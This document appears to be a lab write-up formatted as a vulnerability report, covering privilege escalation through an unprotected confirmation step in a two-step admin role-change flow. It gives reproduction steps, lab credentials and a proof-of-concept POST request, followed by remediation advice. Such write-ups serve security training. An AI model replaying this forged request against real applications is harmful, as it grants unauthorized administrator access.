# Vulnerability Report: Privilege Escalation via Missing Access Control on Multi-Step Process

**Severity:** Medium  
**CVSS Score:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N)  
**Date:** 2026-08-01  
**Target:** variableSub.web-security-academy.net  

## Executive Summary
A broken access control vulnerability was identified in the admin panel's user role management functionality.
The application implements a two-step process for changing user roles — a selection step followed by a confirmation step.
Access control is enforced on the first step, but the confirmation step (`confirmed=true`) is not protected —
any authenticated user can send the final confirmation request directly, bypassing the authorization check entirely.
An attacker with any valid session can promote themselves to administrator without ever accessing the admin panel.

## Vulnerability Details
| Field | Value |
|-------|-------|
| Type | Broken Access Control — Missing Authorization on Multi-Step Process |
| Endpoint | `POST /admin-roles` |
| Method | POST |
| Protection | Partial — authorization is checked on step 1 but not on step 2 |
| Bypass | Sending the confirmation request directly with a non-admin session |
| Requirement | Any authenticated session on the platform |
| User Interaction | Not required |

## Steps to Reproduce
1. Log in with valid credentials (`wiener:peter`) — a session cookie is issued.
2. Using a separate admin session, observe the two-step role change flow in the admin panel:
   - Step 1: `POST /admin-roles` with `username=<target>&action=upgrade`
   - Step 2: `POST /admin-roles` with `action=upgrade&confirmed=true&username=<target>`
3. Send the step 2 request directly using the `wiener` session cookie, replacing `username` with `wiener`.
4. Observe a `302 Found` response redirecting to `/admin` — the action was accepted.
5. Reload the account page — `wiener` now has administrator privileges.

## Proof of Concept
```http
POST /admin-roles HTTP/1.1
Host: variableSub.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Cookie: session=<wiener_session>

action=upgrade&confirmed=true&username=wiener
```

**Response:**
```http
HTTP/1.1 302 Found
Location: /admin
```

## Impact
Any authenticated user can escalate their own privileges to administrator level by sending a single crafted POST request.
No admin credentials are required, no special tooling is needed, and the attack leaves no obvious trace in normal application flows.

This can lead to:
- Full privilege escalation for any authenticated user on the platform
- Unauthorized access to the admin panel and all administrative functionality
- Ability to modify, delete, or take over any user account on the platform
- Complete compromise of platform integrity if admin functionality includes destructive or sensitive operations

## Remediation
- Authorization must be enforced independently on every step of a multi-step process. The server cannot assume that a request reaching step 2 was legitimately initiated through step 1 by an authorized user.
- Each sensitive action must verify that the requesting session has the required privileges to perform it — regardless of where in the flow the request originates.
- Consider binding the confirmation step to a server-side token generated during step 1 and tied to the session. This prevents an attacker from forging the final step in isolation.
- Conduct a full audit of other multi-step flows in the application for similar missing authorization checks.

## References
- OWASP: Broken Access Control (A01:2021)
- CWE-285: Improper Authorization
- CWE-306: Missing Authentication for Critical Function
- PortSwigger: Multi-Step Process Vulnerabilities